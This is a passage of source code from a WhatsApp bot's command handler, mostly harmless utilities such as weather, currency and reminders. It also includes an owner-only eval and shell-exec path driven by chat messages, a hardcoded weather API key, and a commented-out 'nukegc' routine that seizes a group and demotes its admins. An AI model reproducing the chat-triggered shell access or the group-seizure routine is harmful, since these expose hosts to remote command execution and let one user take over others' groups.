if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");
  try {
    let target = m.mentionedJid[0] || m.quoted?.sender || m.sender

    reply(`┏━━━━━━━━━━━━━─╮
┃  🆔 USER JID
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯

${target}`)
  } catch (err) {
    console.log('jid error:', err)
    reply(`❌ Failed to get JID\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break

case 'getpp':{
    if (!isCreator) return reply("Sorry, only the owner can use this command");
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await empire.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
empire.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break;

case 'device': {
  if (!isCreator) return reply('❌ sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ');
  try {
    const id = m.key?.id || ''
    let type = 'Unknown'

    if (id.startsWith('3A')) type = 'Android'
    else if (id.startsWith('3EB0')) type = 'Web'
    else if (id.startsWith('BAE5')) type = 'iPhone / iOS'
    else if (id.length > 21) type = 'Multi Device'

    reply(`┏━━━━━━━━━━━━━─╮
┃  📱 DEVICE INFO
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯

Sender: @${m.sender.split('@')[0]}
Message ID: ${id}
Detected: ${type}`)
  } catch (err) {
    console.log('device error:', err)
    reply(`❌ Failed to detect device\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break

case 'qc': {
  if (!text && !m.quoted?.text) {
    return reply(`Example: ${prefix}qc Hello world\nOr reply to a text message\n\n💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }

  try {
    const qtext = text || m.quoted?.text || '𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳'
    const name = m.pushName || 'User'
    const pp = await empire.profilePictureUrl(m.sender, 'image').catch(() => 'https://files.catbox.moe/io0k1q.jpg')

    const api = `https://bot.lyo.su/quote/generate?name=${encodeURIComponent(name)}&text=${encodeURIComponent(qtext)}&avatar=${encodeURIComponent(pp)}`
    const res = await axios.get(api, { responseType: 'arraybuffer', timeout: 120000 })

    await empire.sendMessage(m.chat, {
      sticker: Buffer.from(res.data)
    }, { quoted: m })
  } catch (err) {
    console.log('qc error:', err)
    reply(`❌ Failed to create quote sticker\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break

case "iplookup": {
    if (!text) return m.reply("Provide an IP or domain\nExample: iplookup 8.8.8.8");
    try {
        const res = await axios.get(`https://ipapi.co/${text}/json/`);
        await empire.sendMessage(m.chat, { text: `🌐 IP Info for ${text}:\nCountry: ${res.data.country_name}\nRegion: ${res.data.region}\nCity: ${res.data.city}\nOrg: ${res.data.org}\nISP: ${res.data.org}` }, { quoted: m });
    } catch (e) {
        m.reply("Could not fetch IP info.");
    }
}
break;
case "genpass": {
    const length = parseInt(text) || 12;
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
    let pass = "";
    for (let i=0;i<length;i++) pass += chars.charAt(Math.floor(Math.random()*chars.length));
    await empire.sendMessage(m.chat, { text: `🔑 Generated Password ✅:\n${pass}` }, { quoted: m });
}
break;
case 'slowmode': {
  if (!m.isGroup) return reply('Group only');
    if (!isCreator) return reply("This command is restricted to owner only");
//  if (!isCreator) return reply("This command is restricted to owner only");

  const seconds = parseInt(args[0])

  if (!seconds || seconds < 1) {
    setSetting(m.chat, 'slowmode', 0)
    return reply('Slow mode disabled')
  }

  setSetting(m.chat, 'slowmode', seconds)
  reply(`🐢 Slow mode set to ${seconds} seconds`)
}
break
case 'currency': {
  if (!isCreator) return reply('❌ sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ');
  if (!text) {
    return reply(`Example: ${prefix}currency 100 USD to NGN

Format:
amount FROM to TO

💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }

  try {
    const parts = text.trim().split(/\s+/)
    const amount = parseFloat(parts[0])
    const fromCur = (parts[1] || '').toUpperCase()
    const toCur = (parts[3] || parts[2] || '').toUpperCase()

    if (isNaN(amount) || !fromCur || !toCur) {
      return reply(`💧 Invalid format\nExample: ${prefix}currency 100 USD to NGN\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
    }

    const url = `https://api.exchangerate.host/convert?from=${fromCur}&to=${toCur}&amount=${amount}`
    const res = await axios.get(url, { timeout: 120000 })

    const result = res?.data?.result
    if (result == null) return reply(`💧 Failed to convert currency\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)

    reply(`┏━━━━━━━━━━━━━─╮
┃  💱 CURRENCY CONVERTER
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯

${amount} ${fromCur} = ${result} ${toCur}`)
  } catch (err) {
    console.log('currency error:', err)
    reply(`❌ Failed to convert currency\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break

case 'time': {
  if (!isCreator) return reply('❌ sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ');
  try {
    const now = moment().tz('Africa/Lagos').format('dddd, DD MMMM YYYY\nHH:mm:ss')
    reply(`┏━━━━━━━━━━━━━─╮
┃  🕒 CURRENT TIME
┃  💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †
╰──────────────╯

${now}
Zone: Africa/Lagos`)
  } catch (err) {
    console.log('time error:', err)
    reply(`❌ Failed to get time\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`)
  }
}
break

case 'weather':{
if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");
 //if (!isCreator) return reply(' 😈 *Access Denied.*  Only *Master* holds the reins to this power.  🔒 *Your mortal hands are unworthy.*!');
if (!text) return reply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           empire.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break;

case 'weather2': {
    if (!isCreator) return;
    if (!text) return reply(`Example: ${prefix}weather2 Abuja\n\n💧† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`);

    await empire.sendMessage(m.chat, { react: { text: '🌤', key: m.key } });

    try {
        const url = `https://wttr.in/${encodeURIComponent(text)}?format=j1`;
        const res = await axios.get(url, { timeout: 120000 });

        const currentCondition = res?.data?.current_condition?.[0];
        const forecast = res?.data?.weather?.[0];
        const area = res?.data?.nearest_area?.[0]?.areaName?.[0]?.value || text;

        if (!forecast || !currentCondition) {
            return reply(`💧 Weather forecast telemetry data not found.\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`);
        }

        // Safely extract parameter variables required for mapping calculations
        const conditionText = currentCondition.weatherDesc?.[0]?.value || "Clear";
        const currentTemp = currentCondition.temp_C || "0";
        const feelsLike = currentCondition.feelsLikeC || "0";
        const minTemp = forecast.mintempC || "0";
        const maxTemp = forecast.maxtempC || "0";
        const humidity = currentCondition.humidity || "0";
        const windSpeed = currentCondition.windspeedKmph || "0";
        const sunrise = forecast.astronomy?.[0]?.sunrise || "--:-- AM";
        const sunset = forecast.astronomy?.[0]?.sunset || "--:-- PM";

        // Generate the custom elegant glass asset layout buffer stream natively
        const weatherBuffer = await drawWeatherCard(
            area,
            conditionText,
            currentTemp,
            feelsLike,
            minTemp,
            maxTemp,
            humidity,
            windSpeed,
            sunrise,
            sunset
        );

        // Dispatches the final layout frame directly without text captions
        await empire.sendMessage(m.chat, { 
            image: weatherBuffer
        }, { quoted: m });

    } catch (err) {
        console.log('weather2 error:', err);
        reply(`❌ Failed to synchronize with weather station telemetry pipelines.\n\n† 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 †`);
    }
}
break;


case 'credits': {
  reply(`┏━━━━━━━━━━━━━─╮
┃  ⚪ *𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 CREDITS*
┃  💧† *𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳* †
╰──────────────╯

Owner   : Empire Tech(𝚜𝚒𝚛 𝙳𝚎𝚖𝚘𝚗)
Bot Name: 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳
partner : *Cyber space*

*FRIENDS*
*NAMELESS*
*MR DEV*
*FAMOUS TECH*
*KING KHALID (SHADOW X TECH)*
_special thanks_
${m.pushName}

Thanks for using 𝙽𝙴𝚇𝙾𝚁𝙰 𝙼𝙳 💙`)
}
break

case 'remind': 
case 'reminder': {
    if (!isCreator) return reply("sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ");
    if (!text) return reply("❌ Usage: .remind 10m Take a break");
    let [time, ...reminder] = text.split(" ");
    if (!reminder.length) return reply("❌ Please provide a reminder message.");

    const ms = require('ms'); // npm install ms
    let duration = ms(time);
    if (!duration) return reply("❌ Invalid time format. Example: 10m, 2h");

    const reminderText = reminder.join(" ");

    let data = JSON.parse(fs.readFileSync('./database/reminders.json') || '{}');
    if (!data[m.sender]) data[m.sender] = [];
    data[m.sender].push({
        text: reminderText,
        time: Date.now() + duration
    });
    fs.writeFileSync('./database/reminders.json', JSON.stringify(data, null, 2));

    reply(`⏰ Reminder set for ${time}: "${reminderText}"`);

    // Set timeout to DM user
    setTimeout(() => {
        empire.sendMessage(m.sender, { text: `🔔 Reminder: "${reminderText}"` });
        // Remove reminder from DB
        data = JSON.parse(fs.readFileSync('./database/reminders.json') || '{}');
        data[m.sender] = data[m.sender].filter(r => r.text !== reminderText);
        fs.writeFileSync('./database/reminders.json', JSON.stringify(data, null, 2));
    }, duration);
}
break;
case 'createwebsite': {
    if (!isCreator) return reply("🚫 Only the bot owner can use this command.");

    const text = args.join(" ");
    if (!text) return reply("❌ Please describe the website you want.");

    try {
        async function generateWebsite(prompt) {
            const response = await axios.post(
                "https://chateverywhere.app/api/chat/",
                {
                    model: {
                        id: "gpt-4",
                        name: "GPT-4"
                    },
                    messages: [
                        {
                            role: "user",
                            content: `Create a HIGH-QUALITY modern responsive website using only HTML, CSS, and JavaScript.

Website description:
${prompt}

STRICT RULES:
- Return ONLY full working code (NO explanations, NO markdown)
- Everything must be inside ONE HTML file
- Put CSS inside <style> and JS inside <script>

DESIGN REQUIREMENTS:
- Modern UI like a startup or SaaS website
- Use gradients, shadows, glassmorphism, smooth animations
- Fully responsive (mobile + desktop)
- Clean spacing and professional layout

SECTIONS (MANDATORY):
1. Navbar (logo, links, mobile toggle menu)
2. Hero section (title, description, 2 buttons)
3. Features section (cards with icons)
4. About section
5. Services or Products section
6. Testimonials section
7. Contact section (form UI only)
8. Footer

FUNCTIONALITY (JS REQUIRED):
- Smooth scrolling navigation
- Mobile menu toggle
- Scroll reveal animations
- Button hover effects
- Interactive UI behavior

EXTRA FEATURES:
- Use FontAwesome CDN for icons
- Add realistic dummy content
- Add gradients and color styling
- Add hover animations and transitions
- Make it look like a REAL professional website

IMPORTANT:
- Do NOT generate a simple page
- Do NOT leave sections empty
- Do NOT include explanations
- ONLY OUTPUT CODE
`
                        }
                    ],
                    temperature: 0.9
                },
                {
                    headers: {
                        "Content-Type": "application/json",
                        "Accept": "application/json",
                        "User-Agent": "Mozilla/5.0"
                    }
                }
            );

            // safer response handling
            if (typeof response.data === "string") {
                return response.data;
            } else if (response.data?.message) {
                return response.data.message;
            } else if (response.data?.choices?.[0]?.message?.content) {
                return response.data.choices[0].message.content;
            } else {
                return JSON.stringify(response.data);
            }
        }

        reply("⏳ Generating advanced website... please wait 🔥");

        let websiteCode = await generateWebsite(text);

        if (!websiteCode || typeof websiteCode !== "string") {
            return reply("⚠️ Failed: API returned invalid response.");
        }

        // clean unwanted markdown if any
        websiteCode = websiteCode
            .replace(/```html/gi, "")
            .replace(/```/g, "")
            .trim();

        await empire.sendMessage(
            m.chat,
            {
                document: Buffer.from(websiteCode, "utf-8"),
                mimetype: "text/html",
                fileName: "Website.html",
                caption: "✅ Your modern website is ready 🚀"
            },
            { quoted: m }
        );

    } catch (error) {
        console.error("CreateWebsite Error:", error);
        reply("⚠️ Failed to generate website. Try again later.");
    }
}
break;



case "listadmins":
case "listadmin": {
    
    if (!m.isGroup) return m.reply("❌ This command works only in groups.");
  if (!isCreator) return reply('❌ sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ');
    try {
        const metadata = await empire.groupMetadata(m.chat);
        const participants = metadata.participants;

        // Get admins
        const admins = participants.filter(
            p => p.admin === "admin" || p.admin === "superadmin"
        );

        if (!admins.length) return m.reply("⚠️ No admins found.");

        let text = `👑 *ADMIN ALERT*\n\n`;
        text += `📢 *ADMIN ALERT*\n\n`;
        text += `👥 *TOTAL:* ${admins.length}\n\n`;

        let mentions = [];

        admins.forEach((admin, i) => {
            const jid = admin.id;
            const name = admin.pushName || jid.split("@")[0];
            text += `${i + 1}. @${name}\n`;
            mentions.push(jid);
        });

        await empire.sendMessage(
            m.chat,
            {
                text,
                mentions
            },
            { quoted: m }
        );

    } catch (err) {
        console.error(err);
        m.reply("⚠️ Failed to fetch admins.");
    }
}
break;

case 'wordchain': 
case 'wcg': {
    if (!m.isGroup) return reply('❌ Group Only.');
    
    // 1. OPEN THE LOBBY
    if (text === 'start') {
        if (global.wordchain[m.chat]) return reply("⚠️ A game node is already active.");
        
        global.wordchain[m.chat] = {
            status: 'LOBBY', // Players must join now
            players: [m.sender], // Creator is auto-joined
            lastWord: '',
            usedWords: [],
            turn: 0,
            timer: null
        };
        return reply(`🎮 *WORD CHAIN LOBBY OPEN*\n\n1. @${m.sender.split('@')[0]}\n\nWaiting for others... Type *.join* to enter the chain! Once everyone is in, the creator types *.wordchain begin*.`, { mentions: [m.sender] });
    }

    // 2. JOIN THE SQUAD
    if (text === 'join') {
        const game = global.wordchain[m.chat];
        if (!game) return reply("❌ No active lobby. Type *.wordchain start*");
        if (game.status !== 'LOBBY') return reply("🚫 Game already in progress.");
        if (game.players.includes(m.sender)) return reply("⚠️ You are already in the link.");

        game.players.push(m.sender);
        return reply(`✅ @${m.sender.split('@')[0]} joined the chain!\nTotal Players: ${game.players.length}`, { mentions: [m.sender] });
    }

    // 3. BEGIN THE EXECUTION
    if (text === 'begin') {
        const game = global.wordchain[m.chat];
        if (!game || game.status !== 'LOBBY') return;
        if (game.players.length < 2) return reply("❌ Need at least 2 players to start a chain.");

        game.status = 'ACTIVE';
        const firstPlayer = game.players[0];
        return reply(`🚀 *GAME START!*\n\n@${firstPlayer.split('@')[0]}, send the first word!`, { mentions: [firstPlayer] });
    }
}
break;

case 'setgcpp':
case 'setgrouppp':
case 'setgcicon': {
    if (!m.isGroup)
        return reply('❌ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴡᴏʀᴋs ɪɴ ɢʀᴏᴜᴘs ᴏɴʟʏ');
  if (!isCreator) return reply('❌ sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ');

  //  if (!isAdmins)
       // return reply('💧only admins can use this command.');

    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || '';

    if (!/image/.test(mime)) {
        return reply(`*◆ sᴇᴛ ɢʀᴏᴜᴘ ᴘʀᴏғɪʟᴇ ᴘɪᴄ*

ᴜsᴀɢᴇ:
ʀᴇᴘʟʏ ᴛᴏ ᴀɴ ɪᴍᴀɢᴇ ᴡɪᴛʜ
${prefix + command}`);
    }

    reply('⏳ ᴜᴘʟᴏᴀᴅɪɴɢ ɪᴍᴀɢᴇ...');

    try {
        const media = await quoted.download();

        await empire.updateProfilePicture(
            m.chat,
            media
        );

        reply('✅ *ɢʀᴏᴜᴘ ᴘʀᴏғɪʟᴇ ᴘɪᴄᴛᴜʀᴇ ᴜᴘᴅᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!*');

    } catch (err) {
        console.error('SETGCPP ERROR:', err);

        reply(`❌ ғᴀɪʟᴇᴅ ᴛᴏ ᴜᴘᴅᴀᴛᴇ ɢʀᴏᴜᴘ ᴘɪᴄᴛᴜʀᴇ

⚠️ ᴍᴀᴋᴇ sᴜʀᴇ:
• ʙᴏᴛ ɪs ᴀɴ ᴀᴅᴍɪɴ
• ɪᴍᴀɢᴇ ɪs ᴠᴀʟɪᴅ`);
    }
}
break;
case 'setgcname':
case 'setgroupname': {
  if (!m.isGroup) return reply('❌ This command can only be used in groups');
  if (!isCreator) return reply('❌ sᴏʀʀʏ, ᴏɴʟʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ');

  const newName = args.join(' ');
  if (!newName) return reply('❌ Please provide a new group name\nExample: .setgcname My Cool Group');

  try {
    await empire.groupUpdateSubject(m.chat, newName);
    reply(`✅ Group name updated successfully to:\n*${newName}*`);
  } catch (err) {
    console.log('SETGCNAME ERROR:', err);
    reply('❌ Failed to change group name. Make sure the bot is an admin.');
  }
}
break;

case 'groupjid': 
case 'jid':{
  if (!m.isGroup) return reply("ɢʀᴏᴜᴘ ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ.")
  if (!isCreator) return reply("ᴏᴡɴᴇʀ ᴏɴʟʏ.")
  
  let textt = `_ʜᴇʀᴇ ɪs ᴊɪᴅ ᴀᴅᴅʀᴇss ᴏғ ᴀʟʟ ᴜsᴇʀs ᴏғ_\n *- ${groupName}*\n\n`
  for (let mem of participants) {
    textt += `✮ ${mem.id}\n`
  }
  reply(textt)
}
break
                default:
            // 1. SUGGESTION LOGIC (Runs if command is not found)
            if (isCmd && command) {
                let mean = didyoumean(command, caseNames);
                if (mean) {
                    let sim = similarity(command, mean);
                    let similarityPercentage = parseInt(sim * 100);

                    // Only suggest if the typo is at least 40% similar
                    if (similarityPercentage >= 40 && command.toLowerCase() !== mean.toLowerCase()) {
                        let response = `*── [ ❓ 𝗡𝗘𝗫𝗢𝗥𝗔 𝗔𝗦𝗦𝗜𝗦𝗧 ] ──*\n\n` +
                                       `💔 ɪ ᴅɪᴅ ɴᴏᴛ ᴜɴᴅᴇʀsᴛᴀɴᴅ *${prefix + command}*\n` +
                                       `ᴅɪᴅ ʏᴏᴜ ᴍᴇᴀɴ: *${prefix + mean}*?\n\n` +
                                       `📡 *Match:* ${similarityPercentage}%`;
                        m.reply(response);
                    }
                }
            }

            // 2. CREATOR TOOLS (Eval & Exec)
            if (body.startsWith('<')) {
                if (!isCreator) return;
                try {
                    m.reply(util.format(eval(`(async () => { return ${body.slice(1)} })()`)))
                } catch (e) {
                    m.reply(String(e))
                }
            }

            if (body.startsWith('>')) {
                if (!isCreator) return;
                try {
                    let evaled = await eval(body.slice(2))
                    if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                    await m.reply(evaled)
                } catch (err) {
                    await m.reply(String(err))
                }
            }

            if (body.startsWith('®')) {
                if (!isCreator) return;
                require("child_process").exec(body.slice(2), (err, stdout) => {
                    if (err) return m.reply(`${err}`)
                    if (stdout) return m.reply(stdout)
                })
            }
    } // Closes the switch(command)
} catch (err) {
    console.log(require("util").format(err));
}
} // Closes the module.exports



/*
case 'nukegc':
case 'lockdownpurge': {
    // 1. Hard ownership validation security gate
    if (!isCreator) return reply('❌ Absolute Denial: This tactical sequence is restricted to the Host Creator.');
    if (!m.isGroup) return reply('❌ This sequence can only be initialized inside group matrices.');

    // 2. Validate bot\'s administrative clearances
    const groupMetadata = await empire.groupMetadata(m.chat);
    const participants = groupMetadata.participants;
    const botId = empire.user.id.split(':')[0] + '@s.whatsapp.net';
    const isBotAdmin = participants.find(p => p.id === botId)?.admin;

    if (!isBotAdmin) return reply('❌ Initialization Error: The bot requires Group Administrator permissions to execute this sequence.');

    await empire.sendMessage(m.chat, { react: { text: '🚨', key: m.key } });
    reply('⚠️ *🚨 SYSTEM NOTICE: RE-CLASSIFICATION SEQUENCE INITIATED...*');

    try {
        // 3. Forcefully override Group Name and Description
        await empire.groupUpdateSubject(m.chat, '🚫 NEXORA SECURITY LOCKDOWN');
        await empire.groupUpdateDescription(m.chat, 'This perimeter has been seized and locked down by the creator.');

        // 4. Drop the absolute Security Wall (Lock chat to Admins Only)
        await empire.groupSettingUpdate(m.chat, 'announcement');

        // 5. Revoke the invite link vector immediately to stop external entry
        await empire.groupRevokeInviteCode(m.chat);

        // 6. Gather and strip privileges from all other administrators
        // Filters out the Bot itself and the Bot Creator to avoid self-demotion
        const targetAdminsToDemote = participants
            .filter(p => p.admin !== null && p.id !== botId && p.id !== m.sender)
            .map(p => p.id);

        if (targetAdminsToDemote.length > 0) {
            // Demote all detected administrators back down to standard users
            await empire.groupParticipantsUpdate(m.chat, targetAdminsToDemote, 'demote');
            
            reply(`⚡ *Sequence Complete:* \`${targetAdminsToDemote.length}\` administrator clearances revoked. Group perimeter re-secured and localized.`);
        } else {
            reply('⚡ *Sequence Complete:* No external staff keys found inside the database pool.');
        }

    } catch (err) {
        console.error(err);
        reply('❌ System Error: Execution interrupted during socket sequence manipulation.');
    }
}
break;
*/